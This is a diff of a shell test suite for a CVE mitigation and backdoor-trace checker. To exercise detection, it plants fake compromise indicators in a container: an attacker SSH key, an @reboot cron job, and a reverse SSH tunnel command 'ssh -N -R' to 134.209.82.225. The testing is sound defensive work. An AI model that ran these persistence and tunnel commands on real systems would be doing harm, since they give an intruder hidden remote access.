@@ -44,7 +44,8 @@ probe() { python3 /tmp/probe.py "$1"; }
 if su -s /bin/bash nobody -c "bash $S" >/dev/null 2>&1; then fail "non-root accepted"; else ok "non-root refused"; fi
 rc=0; OUT="$(bash $S --status 2>&1)" || rc=$?
 [ "$rc" = 1 ] && ok "--status exit 1 before apply" || fail "--status before apply: rc=$rc"
-grep -q 'no traces of the backdoored version' <<<"$OUT" && ok "clean host: no traces reported" || fail "clean host output"
+grep -q 'Result: OK - no traces' <<<"$OUT" && ok "clean host: item 1 result OK" || fail "clean host output"
+grep -q 'Result: NOT ACTIVE' <<<"$OUT" && ok "item 2 result NOT ACTIVE before apply" || fail "item 2 before apply"
 
 bash $S >/tmp/apply.log 2>&1 || { cat /tmp/apply.log; fail "apply"; }
 ok "apply (installed nftables: $(nft --version))"
@@ -54,37 +55,45 @@ nft list table inet cve_2026_98432 | grep -q 'counter packets [1-9]' && ok "drop
 
 bash $S >/dev/null 2>&1 && bash $S >/dev/null 2>&1
 [ "$(nft list table inet cve_2026_98432 | grep -c hdrlength)" = 1 ] && ok "re-apply x2: still one rule" || fail "duplicate rules"
-bash $S --status >/dev/null 2>&1 && ok "--status exit 0 when active" || fail "--status"
+rc=0; OUT="$(bash $S --status 2>&1)" || rc=$?
+[ "$rc" = 0 ] && grep -q 'Result: ACTIVE' <<<"$OUT" && ok "--status exit 0, item 2 result ACTIVE" || fail "--status rc=$rc"
 
 # --- Claude Code extension check: plant the published traces for user alice.
 useradd -m -s /bin/bash alice
 H=/home/alice
 mkdir -p "$H/.ssh" "$H/.config" "$H/.cursor/extensions/anthropic.claude-code-2.1.313-linux-x64" \
-  "$H/.vscode/extensions/anthropic.claude-code-2.1.314-linux-x64"
+  "$H/.vscode/extensions/anthropic.claude-code-2.1.314-linux-x64" "$H/.windsurf/extensions/anthropic.claude-code-2.1.312-linux-x64"
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry" >"$H/.ssh/authorized_keys"
 echo 'ssh -N tunnel@134.209.82.225' >"$H/.config/.smt"
 echo 'var h="134.209.82.225";' >"$H/.cursor/extensions/anthropic.claude-code-2.1.313-linux-x64/extension.js"
 echo 'module.exports={};' >"$H/.vscode/extensions/anthropic.claude-code-2.1.314-linux-x64/extension.js"
+echo 'module.exports={};' >"$H/.windsurf/extensions/anthropic.claude-code-2.1.312-linux-x64/extension.js"
 echo "test" >/tmp/.stk_0123456789
 chown -R alice:alice "$H"
 echo "@reboot /bin/sh \"$H/.config/.smt\"" | crontab -u alice -
 bash -c 'exec -a "ssh -N -R *:0:localhost:22 tunnel@134.209.82.225" sleep 300' &
 FAKE=$!
+# Decoy: a process that only mentions the IP (e.g. someone searching logs) is not a trace.
+bash -c 'sleep 300; : grep 134.209.82.225' &
+DECOY=$!
 sleep 1
 rc=0; OUT="$(bash $S --status 2>&1)" || rc=$?
 [ "$rc" = 3 ] && ok "traces planted: --status exit 3" || { echo "$OUT"; fail "traces: rc=$rc"; }
-grep -q '6 trace(s)' <<<"$OUT" && ok "all 6 traces reported (key, .smt, extension.js, .stk_, cron, process)" || { echo "$OUT"; fail "trace count"; }
-grep -q 'Affected version number installed' <<<"$OUT" && ok "affected version number noted" || fail "version note"
+grep -q 'Result: ATTENTION - 6 trace(s)' <<<"$OUT" && ok "item 1 result ATTENTION, 6 traces (key, .smt, extension.js, .stk_, cron, process)" || { echo "$OUT"; fail "trace count"; }
+grep -q 'user alice: 4 trace(s) found' <<<"$OUT" && ok "traces grouped under user alice" || { echo "$OUT"; fail "per-user line"; }
+grep -q 'ACTION NEEDED (item 1)' <<<"$OUT" && grep -q '2. Ubuntu network protection: *ACTIVE' <<<"$OUT" && ok "summary keeps item 1 (ATTENTION) and item 2 (ACTIVE) apart" || { echo "$OUT"; fail "summary"; }
+grep -q 'extension version 2.1.312 is installed, but its files are clean' <<<"$OUT" && ok "clean 2.1.312 noted, not counted" || { echo "$OUT"; fail "version note"; }
 grep -q 'claude-code-2.1.314' <<<"$OUT" && fail "clean 2.1.314 reported" || ok "clean version not reported"
 rc=0; bash $S >/dev/null 2>&1 || rc=$?
 [ "$rc" = 3 ] && ok "apply with traces: exit 3" || fail "apply with traces: rc=$rc"
 [ -f "$H/.config/.smt" ] && [ -f /tmp/.stk_0123456789 ] && grep -q svc-telemetry "$H/.ssh/authorized_keys" &&
   crontab -u alice -l | grep -q '.config/.smt' && kill -0 "$FAKE" && ok "check is read-only: traces left untouched" || fail "check changed something"
 
-kill "$FAKE"; crontab -u alice -r; rm -rf "$H/.config/.smt" "$H/.ssh/authorized_keys" /tmp/.stk_0123456789 "$H/.cursor"
+kill "$FAKE" "$DECOY"; crontab -u alice -r; rm -rf "$H/.config/.smt" "$H/.ssh/authorized_keys" /tmp/.stk_0123456789 "$H/.cursor" "$H/.windsurf"
 bash $S --status >/dev/null 2>&1 && ok "traces cleaned: --status exit 0" || fail "after cleanup"
 
-bash $S --remove >/dev/null 2>&1 || fail "--remove"
+OUT="$(bash $S --remove 2>&1)" || fail "--remove"
+grep -q 'Result: REMOVED' <<<"$OUT" && ok "--remove: item 2 result REMOVED" || fail "remove output"
 nft list table inet cve_2026_98432 >/dev/null 2>&1 && fail "table still loaded" || ok "remove: table gone"
 [ ! -e /etc/cve-2026-98432.nft ] && ok "remove: rule file gone" || fail "rule file left"
 [ "$(probe opts)" = connected ] && ok "remove: TCP with IP options connects again" || fail "still blocked"
@@ -92,7 +101,7 @@ IN_CONTAINER
 
 echo "=== Phase 1b: non-Ubuntu Linux runs the extension check only"
 rc=0; OUT="$(docker run --rm -v "${ROOT}:/src:ro" debian:12 bash "/src/${SCRIPT}" 2>&1)" || rc=$?
-if [ "$rc" = 0 ] && grep -q 'not needed on this system' <<<"${OUT}" && grep -q 'no traces' <<<"${OUT}"; then
+if [ "$rc" = 0 ] && grep -q 'Result: NOT NEEDED' <<<"${OUT}" && grep -q 'Result: OK' <<<"${OUT}"; then
   echo "  ok   debian:12: check ran, Ubuntu protection skipped"
 else
   echo "${OUT}"; echo "  FAIL debian:12 (rc=${rc})"; exit 1
